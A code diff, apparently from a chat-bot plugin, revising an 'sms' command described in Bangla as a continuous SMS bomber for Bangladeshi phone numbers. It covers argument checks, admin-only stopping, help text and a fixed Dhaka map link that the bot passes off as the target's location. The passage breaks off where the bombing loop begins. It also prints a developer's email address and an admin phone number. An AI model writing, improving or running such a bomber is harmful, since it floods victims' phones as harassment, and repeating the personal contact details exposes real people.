@@ -1,118 +1,109 @@
 module.exports.config = {
   name: "sms",
-  version: "2.5.0",
+  version: "2.0.0",
   hasPermssion: 0,
-  credits: "CYBER BOT TEAM | Owner: Nur Nabi Khan | Email: nurnobikhan2642@gmail.com",
-  description: "অনবরত এসএমএস বোম্বার, বন্ধ করতে /sms off",
+  credits: "—͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️",
+  description: "অনবরত এসএমএস বোম্বার, বন্ধ করতে /sms off (শুধুমাত্র অ্যাডমিন)",
   commandCategory: "Tool",
   usages: "/sms 01xxxxxxxxx অথবা /sms off",
   cooldowns: 0,
-  dependencies: { "axios": "" }
+  dependencies: { axios: "" }
 };
 
 const axios = require("axios");
 const bombingFlags = {};
-const NUMLOOKUP_API_KEY = "YOUR_NUMLOOKUP_API_KEY_HERE"; // তোমার API key বসাও
 
-function getFormattedDateTime() {
-  const now = new Date();
-  const months = ["জানুয়ারি", "ফেব্রুয়ারি", "মার্চ", "এপ্রিল", "মে", "জুন", "জুলাই", "আগস্ট", "সেপ্টেম্বর", "অক্টোবর", "নভেম্বর", "ডিসেম্বর"];
-  const day = now.getDate();
-  const month = months[now.getMonth()];
-  const year = now.getFullYear();
+// **এখানে তোমার অ্যাডমিন নাম্বার বসাও**
+const ADMIN_ID = "01715559179";
 
-  let hours = now.getHours();
-  const minutes = now.getMinutes().toString().padStart(2, "0");
-  const ampm = hours >= 12 ? "PM" : "AM";
-  hours = hours % 12 || 12;
-
-  return `${day} ${month} ${year} | ${hours}:${minutes} ${ampm}`;
+function getBanglaMonth(monthIndex) {
+  const months = [
+    "জানুয়ারি", "ফেব্রুয়ারি", "মার্চ", "এপ্রিল", "মে", "জুন",
+    "জুলাই", "আগস্ট", "সেপ্টেম্বর", "অক্টোবর", "নভেম্বর", "ডিসেম্বর"
+  ];
+  return months[monthIndex];
 }
 
-async function getPhoneInfo(number) {
-  try {
-    const response = await axios.get(`https://api.numlookupapi.com/v1/validate/${number}?apikey=${NUMLOOKUP_API_KEY}`);
-    return response.data;
-  } catch (error) {
-    return null;
+function formatDateTime(date) {
+  const year = date.getFullYear();
+  const month = getBanglaMonth(date.getMonth());
+  const day = date.getDate();
+  const hours = date.getHours().toString().padStart(2, "0");
+  const minutes = date.getMinutes().toString().padStart(2, "0");
+  const seconds = date.getSeconds().toString().padStart(2, "0");
+
+  return `${day} ${month} ${year}, ${hours}:${minutes}:${seconds}`;
+}
+
+function checkAdminID() {
+  if (!ADMIN_ID || ADMIN_ID.trim() === "100013678366954") {
+    console.error("❌ ERROR: ADMIN_ID সেট করা নেই। বট বন্ধ করা হচ্ছে।");
+    for (const thread in bombingFlags) {
+      bombingFlags[thread] = false;
+    }
+    // process.exit(1); // চাইলে পুরো প্রোগ্রাম বন্ধ করতে uncomment করো
+    return false;
   }
+  return true;
 }
 
 module.exports.run = async ({ api, event, args }) => {
+  if (!checkAdminID()) return;
+
   const threadID = event.threadID;
+  const senderID = event.senderID;
   const number = args[0];
 
+  const latitude = 23.8103;
+  const longitude = 90.4125;
+  const locationURL = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+
+  const helpMessage =
+    "•┄┅════❁🌺❁════┅┄•\n\n" +
+    "☠️••SMS BOMBER BY —͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️💣\n\n" +
+    "ব্যবহার:\n" +
+    "1. /sms 01xxxxxxxxx  (বাংলাদেশি নাম্বার)\n" +
+    "2. /sms off        (বোম্বিং বন্ধ করতে - শুধুমাত্র অ্যাডমিন)\n" +
+    "3. বোম্বিং চলাকালে /sms off দিলে বন্ধ হবে\n" +
+    "4. শুধুমাত্র বাংলাদেশের নম্বর কাজ করবে\n" +
+    "5. নম্বর ১১ ডিজিট হতে হবে\n" +
+    "6. বোম্বিং চলাকালে অন্য কেউ আর বোম্বিং শুরু করতে পারবে না\n" +
+    "7. মজার জন্য ব্যবহার করুন\n\n" +
+    "•┄┅════❁🌺❁════┅┄•";
+
   if (!number) {
-    return api.sendMessage(
-      `•┄┅════❁🌺❁════┅┄•
-☠️ SMS BOMBER BY CYBER BOT TEAM 💣
-👤 Owner: Nur Nabi Khan
-📧 Email: \`nurnobikhan2642@gmail.com\`
-
-ব্যবহার:
-/sms 01xxxxxxxxx
-
-(শুধু মজার জন্য ব্যবহার করুন)
-•┄┅════❁🌺❁════┅┄•`,
-      threadID
-    );
+    return api.sendMessage(helpMessage, threadID);
   }
 
-  if (number.toLowerCase() === "off") {
+  if (number === "off") {
+    if (senderID !== ADMIN_ID) {
+      return api.sendMessage("❌ শুধুমাত্র অ্যাডমিনই বট বন্ধ করতে পারে।", threadID);
+    }
     if (bombingFlags[threadID]) {
       bombingFlags[threadID] = false;
-      return api.sendMessage(
-        "✅ SMS বোম্বার বন্ধ করা হয়েছে।\n\n👤 Owner: Nur Nabi Khan\n📧 Email: `nurnobikhan2642@gmail.com`",
-        threadID
-      );
+      return api.sendMessage("✅ SMS বোম্বার বন্ধ করা হয়েছে।", threadID);
     } else {
       return api.sendMessage("❗এই থ্রেডে কোন বোম্বিং চলছিল না।", threadID);
     }
   }
 
   if (!/^01[0-9]{9}$/.test(number)) {
-    return api.sendMessage(
-      `•┄┅════❁🌺❁════┅┄•
-☠️ SMS BOMBER BY CYBER BOT TEAM 💣
-👤 Owner: Nur Nabi Khan
-📧 Email: \`nurnobikhan2642@gmail.com\`
-
-ব্যবহার:
-/sms 01xxxxxxxxx
-
-(শুধু মজার জন্য ব্যবহার করুন)
-•┄┅════❁🌺❁════┅┄•`,
-      threadID
-    );
+    return api.sendMessage(helpMessage, threadID);
   }
 
   if (bombingFlags[threadID]) {
     return api.sendMessage("❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে /sms off", threadID);
   }
 
-  const dateTime = getFormattedDateTime();
+  bombingFlags[threadID] = true;
+
+  const now = new Date();
+  const formattedDateTime = formatDateTime(now);
 
   api.sendMessage(
-    `✅ SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে...\n🕒 সময়: ${dateTime}\n\n📍 লোকেশন তথ্য সংগ্রহ করা হচ্ছে...\nবন্ধ করতে /sms off`,
+    `✅ SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে।\n\n⏰ সময়: ${formattedDateTime}\n📍 লোকেশন: ${locationURL}\n\nবন্ধ করতে /sms off`,
     threadID
   );
-
-  const info = await getPhoneInfo(`+88${number}`);
-  let infoText = "";
-
-  if (info && info.valid) {
-    infoText =
-      `🌍 লোকেশন তথ্য:\n` +
-      `▪ Country: ${info.country_name || "Unknown"}\n` +
-      `▪ Carrier: ${info.carrier || "Unknown"}\n` +
-      `▪ Line Type: ${info.line_type || "Unknown"}`;
-  } else {
-    infoText = "⚠️ লোকেশন তথ্য পাওয়া যায়নি বা API Key ভুল।";
-  }
-
-  api.sendMessage(infoText, threadID);
-
-  bombingFlags[threadID] = true;
 
   (async function startBombing() {
     while (bombingFlags[threadID]) {
